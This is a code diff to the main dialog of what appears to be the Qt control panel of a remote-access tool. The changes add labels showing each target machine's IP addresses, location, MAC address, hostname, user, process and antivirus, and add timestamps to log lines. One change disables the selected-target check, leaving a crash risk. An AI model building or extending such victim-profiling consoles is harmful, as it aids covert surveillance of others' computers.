@@ -591,15 +591,15 @@ void MainDlg::PolicyAction()
 //
 void MainDlg::AliasAction()
 {
-	if ( 0 == ui.trTarget->selectedItems().count()
-		|| NULL == ui.trTarget->selectedItems()[0]->parent() )
-	{
-		QMessageBox::critical(
-			this,
-			QString::fromLocal8Bit("提示"),
-			QString::fromLocal8Bit("请选择一个目标"));
-		return;
-	}
+	//if ( 0 == ui.trTarget->selectedItems().count()
+	//	|| NULL == ui.trTarget->selectedItems()[0]->parent() )
+	//{
+	//	QMessageBox::critical(
+	//		this,
+	//		QString::fromLocal8Bit("提示"),
+	//		QString::fromLocal8Bit("请选择一个目标"));
+	//	return;
+	//}
 
 	QTreeWidgetItem* item = ui.trTarget->selectedItems()[0];
 
@@ -614,6 +614,7 @@ void MainDlg::AliasAction()
 		// 更新界面
 		QString newAlias = dlg.GetTargetAlias();
 		item->setText(1, newAlias);
+		item->setText(0, newAlias);
 
 		// 更新 target
 		Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
@@ -1365,11 +1366,13 @@ void MainDlg::on_WM_TARGET_INFO_UPDATED(MSG* msg)
 		AddStatusInfo(STATUS_NOTE, Info.c_str());
 
 		treeNode->setText(4, tar->aniRemPublicIpAddr.c_str());
+		ui.label_002_content->setText(tar->aniRemPublicIpAddr.c_str());
 
 		std::string country, location;
 		m_ipfinder.GetAddressByIp(tar->aniRemPublicIpAddr.c_str(), country, location);
 
 		treeNode->setText(6, QString::fromLocal8Bit(country.c_str()));
+		ui.label_004_content->setText(QString::fromLocal8Bit(country.c_str()));
 
 	}
 
@@ -1386,6 +1389,7 @@ void MainDlg::on_WM_TARGET_INFO_UPDATED(MSG* msg)
 		AddStatusInfo(STATUS_NOTE, Info.c_str());
 
 		treeNode->setText(5, tar->aniRemLocalIpAddr.c_str());
+		ui.label_003_content->setText(tar->aniRemLocalIpAddr.c_str());
 	}
 
 	if ( tar->aniRemMacAddr != treeNode->text(6).toStdString() )
@@ -1401,6 +1405,7 @@ void MainDlg::on_WM_TARGET_INFO_UPDATED(MSG* msg)
 		AddStatusInfo(STATUS_NOTE, Info.c_str());
 
 		treeNode->setText(9, tar->aniRemMacAddr.c_str());
+		ui.label_005_content->setText(tar->aniRemMacAddr.c_str());
 	}
 
 	if (tar->dwLangId != 0)
@@ -1410,6 +1415,7 @@ void MainDlg::on_WM_TARGET_INFO_UPDATED(MSG* msg)
 		if ( 0 != strcmp(szLang, "语言中性") )
 		{
 			treeNode->setText(10, QString::fromLocal8Bit(szLang));
+			ui.label_006_content->setText(QString::fromLocal8Bit(szLang));
 		}
 	}
 
@@ -1440,6 +1446,7 @@ void MainDlg::on_WM_TARGET_EXINFO_UPDATED(MSG* msg)
 		if ( 0 != strcmp(szLang, "语言中性") )
 		{
 			treeNode->setText(10, QString::fromLocal8Bit(szLang));
+			ui.label_006_content->setText(QString::fromLocal8Bit(szLang));
 		}
 	}
 
@@ -1466,6 +1473,11 @@ void MainDlg::on_WM_TARGET_EXINFO_UPDATED(MSG* msg)
 			QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64))));
 		ui.tbBasicInfo->setItem(3, 1, new QTableWidgetItem(
 			QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64))));
+
+		ui.label_007_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64)));
+		ui.label_008_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64)));
+		ui.label_009_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64)));
+		ui.label_010_content->setText(QString::fromStdWString(tar->m_antiVirus));
 	}
 }
 
@@ -1567,6 +1579,44 @@ void MainDlg::ShowTarget(QTreeWidgetItem* item, int column)
 void MainDlg::CurrentTargetChanged(QTreeWidgetItem* item, int column)
 {
 	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
+
+	QLabel* basic_info[] = {ui.label_001, ui.label_002, ui.label_003, ui.label_004, ui.label_005, ui.label_006, ui.label_007, ui.label_008, ui.label_009, ui.label_010};
+	const wchar_t* basic_info_tip[] = {L"操作系统", L"外网 ip", L"内网 ip", L"所在地", L"物理地址", 
+		L"语言版本", L"主机名", L"用户名", L"进程名", L"杀毒软件"};
+	QLabel* basic_content[] = {ui.label_001_content, ui.label_002_content, ui.label_003_content, ui.label_004_content, ui.label_005_content, ui.label_006_content, ui.label_007_content, ui.label_008_content, ui.label_009_content, ui.label_010_content};
+
+	
+	ui.label_001_content->setText(QString::fromLocal8Bit(ConvertBuildNumberToStr(tar->dwOsBuildNumber).c_str()));
+	ui.label_002_content->setText(tar->aniRemPublicIpAddr.c_str());
+	ui.label_003_content->setText(tar->aniRemLocalIpAddr.c_str());
+
+	std::string country, location;
+	m_ipfinder.GetAddressByIp(tar->aniRemPublicIpAddr.c_str(), country, location);
+
+	ui.label_004_content->setText(QString::fromLocal8Bit(country.c_str()));
+	ui.label_005_content->setText(tar->aniRemMacAddr.c_str());
+
+	// 扩展信息
+	if (tar->dwLangId != 0)
+	{
+		CHAR szLang[MAX_PATH];
+		VerLanguageNameA(tar->dwLangId, szLang, MAX_PATH);
+		if ( 0 != strcmp(szLang, "语言中性") )
+		{
+			ui.label_006_content->setText(QString::fromLocal8Bit(szLang));
+		}
+	}
+	else
+	{
+		ui.label_006_content->setText(QString::fromLocal8Bit("未知"));
+	}
+
+	ui.label_007_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64)));
+	ui.label_008_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64)));
+	ui.label_009_content->setText(QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64)));
+	ui.label_010_content->setText(QString::fromStdWString(tar->m_antiVirus));
+
+	ui.label_10->setPixmap(QPixmap(GetIconPath(tar)));
 
 
 	//ui.tbPluginStatus->clearContents();
@@ -2018,6 +2068,25 @@ void MainDlg::InitWidgetAppearance()
 	{
 		ui.trTarget->hideColumn(i);
 	}
+
+	QLabel* basic_info[] = {ui.label_001, ui.label_002, ui.label_003, ui.label_004, ui.label_005, ui.label_006, ui.label_007, ui.label_008, ui.label_009, ui.label_010};
+	const wchar_t* basic_info_tip[] = {L"操作系统", L"外网 ip", L"内网 ip", L"所在地", L"物理地址", L"语言版本", L"主机名", L"用户名", L"进程名", L"杀毒软件"};
+	QLabel* basic_content[] = {ui.label_001_content, ui.label_002_content, ui.label_003_content, ui.label_004_content, ui.label_005_content, ui.label_006_content, ui.label_007_content, ui.label_008_content, ui.label_009_content, ui.label_010_content};
+
+	for ( int i = 0; i < sizeof(basic_info) / sizeof(QLabel*); ++i )
+	{
+		basic_info[i]->setText(QString::fromStdWString(std::wstring(basic_info_tip[i])));
+		basic_info[i]->setAlignment(Qt::AlignRight | Qt::AlignVCenter);
+		basic_info[i]->setStyleSheet("QLabel{font-family:'Microsoft Yahei';font-weight:bold;font-size:12px;margin-right:20px;min-width:120px;}");
+		basic_content[i]->setText(QString::fromLocal8Bit("未知"));
+		basic_content[i]->setStyleSheet("QLabel{font-family:'Microsoft Yahei';font-size:12px;min-width:100px;}");
+	}
+
+	ui.label_10->setScaledContents(true);
+	ui.label_10->setFixedSize(150, 150);
+	ui.label_10->setText("");
+	ui.edtLog->setStyleSheet("QTextEdit{background-color:white;font-family:'Microsoft Yahei';font-size:12px;padding:5px;}");
+	ui.trTarget->setMinimumWidth(200);
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -2595,7 +2664,7 @@ void MainDlg::AddStatusInfo(STATUS_LEVEL sl, const wchar_t* lpwzInfo)
 
 	//WriteLogToFile(lpwzInfo);
 	
-	ui.edtLog->append(QString::fromStdWString(std::wstring(lpwzInfo)));
+	ui.edtLog->append(QString("[") + QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss") + "] " + QString::fromStdWString(std::wstring(lpwzInfo)));
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
